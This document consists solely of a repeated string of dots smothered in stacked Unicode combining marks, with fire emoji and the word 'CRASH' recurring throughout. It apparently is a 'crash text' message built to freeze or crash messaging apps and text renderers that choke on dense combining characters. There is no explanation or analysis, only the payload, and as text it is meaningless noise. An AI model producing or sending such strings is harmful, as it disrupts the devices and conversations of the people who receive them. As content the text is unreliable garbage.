̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̨̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘͉̯̣̖̘͈̐̑ͧ̋̓̊̌͒ͨͣ͝͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉̶̸̀́͡͡͝҉̶́͢͏͠͠.̸̴̸̢̡̱̄̈́͂ͩͮ̑͆̉̔͆ͧ́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ ̷̶̛́͢͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀🔥፝⃟ ꙳CRASH🔥፝⃟ 